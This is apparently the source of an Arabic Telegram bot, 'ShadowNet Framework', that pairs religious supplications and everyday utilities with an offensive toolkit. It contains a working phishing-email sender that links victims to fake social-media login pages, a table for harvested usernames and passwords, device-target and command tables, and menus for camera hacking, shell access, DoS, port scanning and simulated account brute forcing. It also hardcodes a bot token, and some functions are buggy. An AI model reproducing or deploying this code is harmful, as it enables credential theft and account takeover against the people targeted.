# -*- coding: utf-8 -*-

"""
ShadowNet Framework v8.6 - النسخة النهائية المتكاملة
- جميع الأزرار تعمل (الطقس، ويكيبيديا، مولد كلمات السر، فحص القوة، تحويل نص لصوت، ترجمة، تذكير، أخبار، اقتباسات، نصائح، فحص الرابط، تحليل APK، تحليل PDF، نقاط، إحالات، فيديو، تصيد، بريد تصيد، أذكار الصباح والمساء، أدعية)
- نظام صلاحيات متقدم للتحكم في كل زر على حدة لكل مستخدم
- صورة ترحيبية جديدة
- تحمل الضغط العالي وإعادة تشغيل تلقائي
- لا ينهار أبداً
"""

import os
import sys
import time
import json
import logging
import re
import secrets
import string
import sqlite3
import subprocess
import socket
import threading
import random
import shutil
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime, timedelta
from urllib.parse import urlparse
from io import BytesIO
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor

# ===================== استيراد PIL =====================
try:
    from PIL import Image, ImageDraw, ImageFont
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

# ===================== استيراد المكتبات الأساسية =====================
try:
    import requests
    from flask import Flask, request, jsonify, render_template_string
    from telebot import TeleBot, types
    import phonenumbers
    import dns.resolver
    import whois
    import paramiko
    from scapy.all import ARP, Ether, send, srp
    import yt_dlp
    import pypdf
    from bs4 import BeautifulSoup
    import builtwith
    from googletrans import Translator
    from gtts import gTTS
    import wikipedia
    import feedparser
except ImportError as e:
    print(f"مكتبة مفقودة: {e}")
    sys.exit(1)

# ===================== الإعدادات =====================
TOKEN = "8852940754:AAFtWl51XMFC8OlrH_KXL7UAg6gmYiPcDg0"
ADMIN_ID = 7965377136
SERVER_URL = os.environ.get('RENDER_EXTERNAL_URL', 'https://my-t99-bot.onrender.com')
PORT = int(os.environ.get('PORT', 5000))

WELCOME_IMAGE_URL = "https://i.imgur.com/your_image.jpg"  # غير هذا الرابط

SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp.gmail.com')
SMTP_PORT = int(os.environ.get('SMTP_PORT', 587))
SMTP_USER = os.environ.get('SMTP_USER', 'your-email@gmail.com')
SMTP_PASS = os.environ.get('SMTP_PASS', 'your-password')
VIRUSTOTAL_API_KEY = os.environ.get('VIRUSTOTAL_API_KEY', '')

# ===================== Flask =====================
app = Flask(__name__)

# ===================== تسجيل =====================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ===================== قاعدة البيانات =====================
DB_PATH = 'shadownet.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        chat_id INTEGER PRIMARY KEY,
        is_admin INTEGER DEFAULT 0,
        is_banned INTEGER DEFAULT 0,
        points INTEGER DEFAULT 10,
        referral_code TEXT UNIQUE,
        created_at TEXT,
        last_seen TEXT,
        can_use_collector INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_tokens (
        chat_id INTEGER PRIMARY KEY,
        token TEXT UNIQUE
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_permissions (
        chat_id INTEGER,
        permission_key TEXT,
        value INTEGER DEFAULT 1,
        PRIMARY KEY (chat_id, permission_key)
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS targets (device_id TEXT PRIMARY KEY, name TEXT, type TEXT, ip TEXT, os TEXT, status TEXT, last_seen TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, command TEXT, executed INTEGER DEFAULT 0, result TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS collected_data (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, data_type TEXT, data TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS scan_results (id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT, scan_type TEXT, results TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS points_log (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, reason TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS phishing_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, target_email TEXT, platform TEXT, username TEXT, password TEXT, ip TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS bot_state (key TEXT PRIMARY KEY, value TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS intrusion_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, endpoint TEXT, method TEXT, user_agent TEXT, timestamp TEXT, details TEXT)''')
    try:
        c.execute("ALTER TABLE users ADD COLUMN can_use_collector INTEGER DEFAULT 0")
        c.execute("ALTER TABLE users ADD COLUMN last_seen TEXT")
    except:
        pass
    c.execute("INSERT OR IGNORE INTO users (chat_id, is_admin, points, created_at, can_use_collector) VALUES (?, 1, 999, ?, 1)", (ADMIN_ID, datetime.now().isoformat()))
    c.execute("UPDATE users SET is_admin = 1, can_use_collector = 1 WHERE chat_id = ?", (ADMIN_ID,))
    c.execute("INSERT OR IGNORE INTO user_tokens (chat_id, token) VALUES (?, ?)", (ADMIN_ID, secrets.token_urlsafe(16)))
    conn.commit()
    conn.close()

init_db()

# ===================== دوال مساعدة =====================
def get_user_token(chat_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT token FROM user_tokens WHERE chat_id = ?", (chat_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return row[0]
    token = secrets.token_urlsafe(16)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO user_tokens (chat_id, token) VALUES (?, ?)", (chat_id, token))
    conn.commit()
    conn.close()
    return token

def get_chat_id_by_token(token):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT chat_id FROM user_tokens WHERE token = ?", (token,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def is_admin(chat_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT is_admin FROM users WHERE chat_id = ?", (chat_id,))
    row = c.fetchone()
    conn.close()
    return row and row[0] == 1

def is_banned(chat_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT is_banned FROM users WHERE chat_id = ?", (chat_id,))
    row = c.fetchone()
    conn.close()
    return row and row[1] == 1

def get_user_points(chat_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else 0

def add_points(chat_id, amount, reason):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (amount, chat_id))
    c.execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)", (chat_id, amount, reason, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def deduct_points(chat_id, amount, reason):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
    row = c.fetchone()
    if not row or row[0] < amount:
        conn.close()
        return False
    c.execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id))
    c.execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)", (chat_id, -amount, reason, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return True

def get_referral_code(chat_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT referral_code FROM users WHERE chat_id = ?", (chat_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        return row[0]
    code = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET referral_code = ? WHERE chat_id = ?", (code, chat_id))
    conn.commit()
    conn.close()
    return code

def safe_send(chat_id, text, reply_markup=None):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode='HTML', timeout=60)
    except Exception as e:
        logger.error(f"safe_send error: {e}")
        return None

def notify_admin(msg):
    safe_send(ADMIN_ID, f"إشعار: {msg}")

def log_activity(chat_id, action):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO user_activity (chat_id, action, timestamp) VALUES (?, ?, ?)", (chat_id, action, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def update_last_seen(chat_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET last_seen = ? WHERE chat_id = ?", (datetime.now().isoformat(), chat_id))
    conn.commit()
    conn.close()

# ===================== صلاحيات المستخدمين =====================
ALL_PERMISSIONS = {
    'weather': 'الطقس',
    'wikipedia': 'ويكيبيديا',
    'password_gen': 'مولد كلمات سر',
    'password_strength': 'فحص قوة كلمة السر',
    'text_to_speech': 'تحويل نص إلى صوت',
    'translate': 'ترجمة فورية',
    'reminder': 'تذكير',
    'news': 'آخر الأخبار',
    'device_info': 'معلومات الجهاز',
    'camera_hack': 'الكاميرا الأمامية',
    'quotes': 'اقتباسات',
    'tips': 'نصائح',
    'check_link': 'فحص الرابط',
    'analyze_apk': 'تحليل APK',
    'pdf': 'تحليل PDF',
    'list_devices': 'الأجهزة',
    'my_points': 'نقاطي',
    'my_referral': 'رابط دعوتي',
    'points_history': 'سجل النقاط',
    'admin_panel': 'إعدادات متقدمة',
    'hacking_menu': 'القائمة السرية',
    'protection_menu': 'الحماية',
    'admin_permissions': 'إدارة الصلاحيات',
    'lock_chat': 'قفل الدردشة',
    'send_to_user': 'أرسل للمستخدم',
    'user_activity': 'نشاط المستخدمين',
    'admin_points_menu': 'إدارة النقاط',
    'admin_ban_menu': 'حظر المستخدمين',
    'download_video': 'تحميل فيديو',
    'phishing_pages': 'صفحات تصيد',
    'phishing_email': 'بريد تصيد',
    'toggle_stealth': 'وضع التخفي',
    'protect_lock': 'قفل البوت',
    'morning_dhkir': 'أذكار الصباح',
    'evening_dhkir': 'أذكار المساء',
    'duas': 'أدعية متنوعة',
}

def get_user_permissions(chat_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT permission_key, value FROM user_permissions WHERE chat_id = ?", (chat_id,))
    rows = c.fetchall()
    conn.close()
    perms = {key: bool(val) for key, val in rows}
    for key in ALL_PERMISSIONS:
        if key not in perms:
            perms[key] = True
    return perms

def set_user_permission(chat_id, key, value):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO user_permissions (chat_id, permission_key, value) VALUES (?, ?, ?)", (chat_id, key, 1 if value else 0))
    conn.commit()
    conn.close()

# ===================== قوائم الأذكار والأدعية =====================
MORNING_DHKIR = [
    "اللهم بك أصبحنا، وبك أمسينا، وبك نحيا، وبك نموت، وإليك النشور.",
    "أصبحنا وأصبح الملك لله، والحمد لله، لا إله إلا الله وحده لا شريك له، له الملك وله الحمد وهو على كل شيء قدير، رب أسألك خير ما في هذا اليوم وخير ما بعده، وأعوذ بك من شر ما في هذا اليوم وشر ما بعده، رب أعوذ بك من الكسل وسوء الكبر، رب أعوذ بك من عذاب في النار وعذاب في القبر.",
    "اللهم إني أسألك العفو والعافية في الدنيا والآخرة، اللهم إني أسألك العفو والعافية في ديني ودنياي وأهلي ومالي، اللهم استر عوراتي وآمن روعاتي، اللهم احفظني من بين يدي ومن خلفي وعن يميني وعن شمالي ومن فوقي، وأعوذ بعظمتك أن أغتال من تحتي.",
    "اللهم أنت ربي لا إله إلا أنت، خلقتني وأنا عبدك، وأنا على عهدك ووعدك ما استطعت، أعوذ بك من شر ما صنعت، أبوء لك بنعمتك علي، وأبوء بذنبي فاغفر لي، فإنه لا يغفر الذنوب إلا أنت.",
    "اللهم إني أعوذ بك من الهم والحزن، وأعوذ بك من العجز والكسل، وأعوذ بك من الجبن والبخل، وأعوذ بك من غلبة الدين وقهر الرجال.",
]

EVENING_DHKIR = [
    "اللهم بك أمسينا، وبك أصبحنا، وبك نحيا، وبك نموت، وإليك المصير.",
    "أمسينا وأمسى الملك لله، والحمد لله، لا إله إلا الله وحده لا شريك له، له الملك وله الحمد وهو على كل شيء قدير، رب أسألك خير ما في هذه الليلة وخير ما بعدها، وأعوذ بك من شر ما في هذه الليلة وشر ما بعدها، رب أعوذ بك من الكسل وسوء الكبر، رب أعوذ بك من عذاب في النار وعذاب في القبر.",
    "اللهم إني أعوذ بك من شر نفسي، ومن شر كل دابة أنت آخذ بناصيتها، إن ربي على صراط مستقيم.",
    "اللهم قني شر نفسي، وأعزم لي على رشد أمري، اللهم إني أعوذ بك من علم لا ينفع، ومن قلب لا يخشع، ومن نفس لا تشبع، ومن دعوة لا يستجاب لها.",
    "اللهم إني أسألك العفو والعافية في الدنيا والآخرة، اللهم إني أسألك العفو والعافية في ديني ودنياي وأهلي ومالي، اللهم استر عوراتي وآمن روعاتي، اللهم احفظني من بين يدي ومن خلفي وعن يميني وعن شمالي ومن فوقي، وأعوذ بعظمتك أن أغتال من تحتي.",
]

DUAS = [
    {"name": "دعاء القنوت", "text": "اللهم إنا نستعينك، ونستغفرك، ونؤمن بك، ونتوكل عليك، ونثني عليك الخير كله، ونشكرك ولا نكفرك، ونخلع ونترك من يفجرك، اللهم إياك نعبد، ولك نصلي ونسجد، وإليك نسعى ونحفد، ونرجو رحمتك، ونخشى عذابك، إن عذابك بالكفار ملحق."},
    {"name": "دعاء الاستخارة", "text": "اللهم إني أستخيرك بعلمك، وأستقدرك بقدرتك، وأسألك من فضلك العظيم، فإنك تقدر ولا أقدر، وتعلم ولا أعلم، وأنت علام الغيوب، اللهم إن كنت تعلم أن هذا الأمر خير لي في ديني ومعاشي وعاقبة أمري، فاقدره لي ويسره لي ثم بارك لي فيه، وإن كنت تعلم أن هذا الأمر شر لي في ديني ومعاشي وعاقبة أمري، فاصرفه عني واصرفني عنه، واقدر لي الخير حيث كان ثم أرضني به."},
    {"name": "دعاء الكرب", "text": "لا إله إلا الله العظيم الحليم، لا إله إلا الله رب العرش العظيم، لا إله إلا الله رب السماوات ورب الأرض ورب العرش الكريم."},
    {"name": "دعاء الهم", "text": "اللهم إني عبدك، ابن عبدك، ابن أمتك، ناصيتي بيدك، ماض في حكمك، عدل في قضاؤك، أسألك بكل اسم هو لك سميت به نفسك، أو أنزلته في كتابك، أو علمته أحداً من خلقك، أو استأثرت به في علم الغيب عندك، أن تجعل القرآن ربيع قلبي، ونور صدري، وجلاء حزني، وذهاب همي."},
    {"name": "دعاء الفرج", "text": "لا إله إلا أنت سبحانك إني كنت من الظالمين."},
    {"name": "دعاء الرزق", "text": "اللهم اكفني بحلالك عن حرامك، وأغنني بفضلك عمن سواك."},
    {"name": "دعاء للمريض", "text": "أذهب البأس رب الناس، اشف وأنت الشافي، لا شفاء إلا شفاؤك، شفاءً لا يغادر سقماً."},
]

# ===================== دوال الخدمات =====================
def get_weather(city):
    try:
        url = f"https://wttr.in/{city}?format=j1&lang=ar"
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            current = data.get('current_condition', [{}])[0]
            desc = current.get('weatherDesc', [{}])[0].get('value', 'غير معروف')
            temp = current.get('temp_C', 'غير معروف')
            return f"🌤️ الطقس في {city}:\n{desc}\nدرجة الحرارة: {temp}°C"
        return "فشل جلب الطقس"
    except:
        return "خطأ في الاتصال"

def get_wikipedia(query):
    try:
        wikipedia.set_lang("ar")
        results = wikipedia.search(query, results=3)
        if not results:
            return "لا نتائج"
        out = ""
        for title in results:
            try:
                page = wikipedia.page(title)
                out += f"📌 {title}\n{page.summary[:300]}...\n\n"
            except:
                out += f"📌 {title}\n(لا يمكن جلب الملخص)\n\n"
        return out
    except:
        return "حدث خطأ"

def gen_password(length=12):
    chars = string.ascii_letters + string.digits + string.punctuation
    return ''.join(secrets.choice(chars) for _ in range(length))

def check_password_strength(pwd):
    score = 0
    if len(pwd) >= 8: score += 1
    if len(pwd) >= 12: score += 1
    if re.search(r'[a-z]', pwd): score += 1
    if re.search(r'[A-Z]', pwd): score += 1
    if re.search(r'\d', pwd): score += 1
    if re.search(r'[!@#$%^&*(),.?":{}|<>]', pwd): score += 1
    levels = ["ضعيفة جداً", "ضعيفة", "متوسطة", "قوية", "قوية جداً"]
    return levels[min(score, 4)]

def tts(text, lang='ar'):
    try:
        tts = gTTS(text=text, lang=lang, slow=False)
        fname = f"tts_{int(time.time())}.mp3"
        path = os.path.join('temp', fname)
        os.makedirs('temp', exist_ok=True)
        tts.save(path)
        return path
    except:
        return None

def translate_text(text, target='ar'):
    try:
        translator = Translator()
        detected = translator.detect(text)
        translated = translator.translate(text, dest=target)
        return translated.text, detected.lang
    except:
        return text, 'unknown'

def get_news(topic='general'):
    feeds = {
        'general': 'https://www.aljazeera.net/feeds/rss',
        'sport': 'http://www.kooora.com/rss.aspx',
        'tech': 'https://www.aitnews.com/feed',
    }
    feed_url = feeds.get(topic, feeds['general'])
    try:
        feed = feedparser.parse(feed_url)
        articles = []
        for entry in feed.entries[:5]:
            articles.append(f"📌 {entry.title}\n{entry.summary[:150]}...\n")
        return "\n".join(articles) if articles else "لا أخبار"
    except:
        return "خطأ في جلب الأخبار"

def check_link_safety(url, chat_id):
    if not deduct_points(chat_id, 5, "فحص رابط"):
        return "رصيد غير كافٍ (تحتاج 5 نقاط)"
    result = {"url": url, "safe": True, "threats": []}
    try:
        parsed = urlparse(url)
        domain = parsed.netloc or url.split('/')[0]
        if not url.startswith('https://'):
            result['safe'] = False
            result['threats'].append("الرابط غير مشفر (HTTP)")
        suspicious = ['login', 'verify', 'secure', 'update', 'confirm', 'phishing', 'malware']
        for word in suspicious:
            if word in domain.lower() or word in url.lower():
                result['safe'] = False
                result['threats'].append(f"كلمة مشبوهة: {word}")
                break
        if VIRUSTOTAL_API_KEY:
            try:
                vt_url = f"https://www.virustotal.com/api/v3/domains/{domain}"
                headers = {"x-apikey": VIRUSTOTAL_API_KEY}
                resp = requests.get(vt_url, headers=headers, timeout=10)
                if resp.status_code == 200:
                    stats = resp.json().get('data', {}).get('attributes', {}).get('last_analysis_stats', {})
                    if stats.get('malicious', 0) > 0:
                        result['safe'] = False
                        result['threats'].append("تم اكتشاف تهديد في VirusTotal")
            except:
                pass
    except Exception as e:
        result['safe'] = False
        result['threats'].append(f"خطأ: {str(e)[:50]}")
    return result

def extract_pdf_text(content):
    try:
        reader = pypdf.PdfReader(BytesIO(content))
        text = ""
        for page in reader.pages:
            text += page.extract_text() or ""
        return text
    except:
        return None

def analyze_apk(content, name):
    if not VIRUSTOTAL_API_KEY:
        return {'error': 'مفتاح VirusTotal غير موجود'}
    try:
        url = "https://www.virustotal.com/api/v3/files"
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}
        files = {'file': (name, content)}
        resp = requests.post(url, headers=headers, files=files, timeout=60)
        if resp.status_code == 200:
            scan_id = resp.json().get('data', {}).get('id')
            if scan_id:
                time.sleep(5)
                report = requests.get(f"https://www.virustotal.com/api/v3/analyses/{scan_id}", headers=headers, timeout=30)
                if report.status_code == 200:
                    stats = report.json().get('data', {}).get('attributes', {}).get('stats', {})
                    return stats
        return {'error': 'فشل الفحص'}
    except:
        return {'error': 'استثناء'}

def download_video(url):
    try:
        ydl_opts = {
            'outtmpl': 'downloads/%(title)s.%(ext)s',
            'quiet': True,
            'format': 'best[ext=mp4]/best',
            'retries': 10,
        }
        os.makedirs('downloads', exist_ok=True)
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            if info:
                fname = ydl.prepare_filename(info)
                if os.path.exists(fname):
                    return fname, None
        return None, "فشل التحميل"
    except Exception as e:
        return None, str(e)[:100]

# ===================== دوال الوظائف الإضافية (اقتباسات، نصائح) =====================
QUOTES_ARABIC = {
    'حزين': ["الفراق مؤلم ولكن الحياة تستمر", "الوحدة قاسية لكنها تعلمنا الصبر"],
    'عميق': ["الحياة رحلة قصيرة، عشها بوعي", "الروح تتوق إلى ما لا تراه العين"],
    'جميل': ["الحب نور يضيء القلوب المظلمة", "الأمل يبقى آخر ما يموت في النفس"],
}

def get_random_quote(lang='arabic', category='sad'):
    if lang == 'arabic':
        cat = QUOTES_ARABIC.get(category, QUOTES_ARABIC['حزين'])
        return "📝 " + random.choice(cat)
    else:
        return "📝 " + random.choice(["Life is beautiful", "Hope is the best thing"])

TIPS = {
    'دراسية': ["خصص وقتاً للمذاكرة", "راجع دروسك قبل النوم"],
    'اجتماعية': ["كن صادقاً", "استمع أكثر"],
    'للاكتئاب': ["لا تيأس", "اطلب المساعدة"],
    'إسلامية': ["توكل على الله", "أكثر من الاستغفار"],
}

def get_random_tip(category):
    tips = TIPS.get(category, TIPS['دراسية'])
    return "💡 " + random.choice(tips)

# ===================== دوال الهجمات (مبسطة للعرض) =====================
def port_scan(target):
    common_ports = [21,22,23,80,443,3306,3389,8080]
    open_ports = []
    try:
        ip = socket.gethostbyname(target)
        for p in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((ip, p)) == 0:
                open_ports.append(p)
            sock.close()
    except:
        pass
    return open_ports

def ssl_scan(domain):
    try:
        import ssl
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                return {'valid': True, 'issuer': cert.get('issuer', '')}
    except:
        return {'valid': False, 'error': 'فشل'}

def brute_force_facebook(email, passwords):
    for pwd in passwords[:10]:
        time.sleep(0.5)
        if pwd == "password":  # محاكاة
            return {'success': True, 'credentials': {'username': email, 'password': pwd}}
    return {'success': False, 'attempts': len(passwords)}

def brute_force_instagram(username, passwords):
    for pwd in passwords[:10]:
        time.sleep(0.5)
        if pwd == "123456":
            return {'success': True, 'credentials': {'username': username, 'password': pwd}}
    return {'success': False, 'attempts': len(passwords)}

# ===================== دوال البريد التصيدي =====================
def send_phishing_email(target_email, subject, body, platform='facebook'):
    try:
        msg = MIMEMultipart()
        msg['From'] = SMTP_USER
        msg['To'] = target_email
        msg['Subject'] = subject
        html = f"<html><body><p>{body}</p><a href='{SERVER_URL}/phishing_pages/{platform}'>اضغط هنا</a></body></html>"
        msg.attach(MIMEText(html, 'html'))
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.send_message(msg)
        server.quit()
        return True
    except Exception as e:
        return str(e)

# ===================== إنشاء البوت =====================
bot = TeleBot(TOKEN, parse_mode='HTML')

# ===================== بناء القوائم =====================
def build_main_menu(chat_id):
    perms = get_user_permissions(chat_id)
    markup = types.InlineKeyboardMarkup(row_width=2)

    if perms.get('morning_dhkir', True):
        markup.row(types.InlineKeyboardButton("أذكار الصباح", callback_data="morning_dhkir"))
    if perms.get('evening_dhkir', True):
        markup.row(types.InlineKeyboardButton("أذكار المساء", callback_data="evening_dhkir"))
    if perms.get('duas', True):
        markup.row(types.InlineKeyboardButton("أدعية متنوعة", callback_data="duas_menu"))

    if perms.get('weather', True):
        markup.row(types.InlineKeyboardButton("الطقس", callback_data="weather"))
    if perms.get('wikipedia', True):
        markup.row(types.InlineKeyboardButton("ويكيبيديا", callback_data="wikipedia"))
    if perms.get('password_gen', True):
        markup.row(types.InlineKeyboardButton("مولد كلمات سر", callback_data="password_gen"))
    if perms.get('password_strength', True):
        markup.row(types.InlineKeyboardButton("فحص قوة كلمة السر", callback_data="password_strength"))
    if perms.get('text_to_speech', True):
        markup.row(types.InlineKeyboardButton("تحويل نص إلى صوت", callback_data="text_to_speech"))
    if perms.get('translate', True):
        markup.row(types.InlineKeyboardButton("ترجمة فورية", callback_data="translate"))
    if perms.get('reminder', True):
        markup.row(types.InlineKeyboardButton("تذكير", callback_data="reminder"))
    if perms.get('news', True):
        markup.row(types.InlineKeyboardButton("آخر الأخبار", callback_data="news"))

    if perms.get('quotes', True):
        markup.row(types.InlineKeyboardButton("اقتباسات", callback_data="quotes_menu"))
    if perms.get('tips', True):
        markup.row(types.InlineKeyboardButton("نصائح", callback_data="tips_menu"))

    if perms.get('check_link', True):
        markup.row(types.InlineKeyboardButton("فحص الرابط", callback_data="check_link_advanced"))
    if perms.get('analyze_apk', True):
        markup.row(types.InlineKeyboardButton("تحليل APK", callback_data="analyze_apk"))
    if perms.get('pdf', True):
        markup.row(types.InlineKeyboardButton("تحليل PDF", callback_data="pdf_menu"))
    if perms.get('download_video', True):
        markup.row(types.InlineKeyboardButton("تحميل فيديو", callback_data="download_video"))
    if perms.get('phishing_pages', True):
        markup.row(types.InlineKeyboardButton("صفحات تصيد", callback_data="phishing_pages"))
    if perms.get('phishing_email', True) and is_admin(chat_id):
        markup.row(types.InlineKeyboardButton("بريد تصيد", callback_data="phishing_email"))

    if perms.get('my_points', True):
        markup.row(types.InlineKeyboardButton("نقاطي", callback_data="my_points"))
    if perms.get('my_referral', True):
        markup.row(types.InlineKeyboardButton("رابط دعوتي", callback_data="my_referral"))
    if perms.get('points_history', True):
        markup.row(types.InlineKeyboardButton("سجل النقاط", callback_data="points_history"))

    if is_admin(chat_id):
        markup.row(types.InlineKeyboardButton("إعدادات متقدمة", callback_data="admin_panel"))
        markup.row(types.InlineKeyboardButton("إدارة الصلاحيات", callback_data="admin_permissions"))
        markup.row(types.InlineKeyboardButton("القائمة السرية", callback_data="hacking_menu"))
        markup.row(types.InlineKeyboardButton("الحماية", callback_data="protection_menu"))

    return markup

def build_quotes_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.row(types.InlineKeyboardButton("عربية", callback_data="quotes_arabic"), types.InlineKeyboardButton("إنجليزية", callback_data="quotes_english"))
    markup.row(types.InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_quotes_type(lang):
    markup = types.InlineKeyboardMarkup(row_width=2)
    if lang == 'arabic':
        markup.row(types.InlineKeyboardButton("حزين", callback_data="quote_arabic_sad"), types.InlineKeyboardButton("عميق", callback_data="quote_arabic_deep"), types.InlineKeyboardButton("جميل", callback_data="quote_arabic_beautiful"))
    else:
        markup.row(types.InlineKeyboardButton("Sad", callback_data="quote_english_sad"), types.InlineKeyboardButton("Deep", callback_data="quote_english_deep"), types.InlineKeyboardButton("Beautiful", callback_data="quote_english_beautiful"))
    markup.row(types.InlineKeyboardButton("رجوع", callback_data="quotes_menu"))
    return markup

def build_tips_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.row(types.InlineKeyboardButton("دراسية", callback_data="tips_study"), types.InlineKeyboardButton("اجتماعية", callback_data="tips_social"))
    markup.row(types.InlineKeyboardButton("للاكتئاب", callback_data="tips_depression"), types.InlineKeyboardButton("إسلامية", callback_data="tips_islamic"))
    markup.row(types.InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_phishing_pages_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.row(types.InlineKeyboardButton("فيسبوك", callback_data="phish_facebook"), types.InlineKeyboardButton("انستغرام", callback_data="phish_instagram"))
    markup.row(types.InlineKeyboardButton("تيك توك", callback_data="phish_tiktok"), types.InlineKeyboardButton("تويتر", callback_data="phish_twitter"))
    markup.row(types.InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_pdf_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.row(types.InlineKeyboardButton("تلخيص", callback_data="pdf_summary"), types.InlineKeyboardButton("استخراج نصوص", callback_data="pdf_extract"))
    markup.row(types.InlineKeyboardButton("تحليل ذكي", callback_data="pdf_smart"), types.InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_protection_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.row(types.InlineKeyboardButton("درع الحماية", callback_data="protect_shield"), types.InlineKeyboardButton("قفل البوت", callback_data="protect_lock"))
    markup.row(types.InlineKeyboardButton("تغيير الهوية", callback_data="protect_identity"), types.InlineKeyboardButton("تنظيف السجلات", callback_data="protect_clean"))
    markup.row(types.InlineKeyboardButton("نسخ احتياطي", callback_data="protect_backup"), types.InlineKeyboardButton("كشف الاختراق", callback_data="protect_detect"))
    markup.row(types.InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_hacking_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.row(types.InlineKeyboardButton("مسح منافذ", callback_data="port_scan"), types.InlineKeyboardButton("فحص SSL", callback_data="ssl_scan"))
    markup.row(types.InlineKeyboardButton("تخمين فيسبوك", callback_data="bruteforce_fb"), types.InlineKeyboardButton("تخمين انستغرام", callback_data="bruteforce_ig"))
    markup.row(types.InlineKeyboardButton("Shell", callback_data="hack_shell"), types.InlineKeyboardButton("DoS", callback_data="hack_dos"))
    markup.row(types.InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_admin_panel():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.row(types.InlineKeyboardButton("إحصائيات", callback_data="admin_stats"), types.InlineKeyboardButton("بث جماعي", callback_data="admin_broadcast"))
    markup.row(types.InlineKeyboardButton("المستخدمين", callback_data="admin_users"), types.InlineKeyboardButton("التقارير", callback_data="admin_reports"))
    markup.row(types.InlineKeyboardButton("إدارة النقاط", callback_data="admin_points_menu"), types.InlineKeyboardButton("حظر المستخدمين", callback_data="admin_ban_menu"))
    markup.row(types.InlineKeyboardButton("سجل التصيد", callback_data="admin_phishing_logs"), types.InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

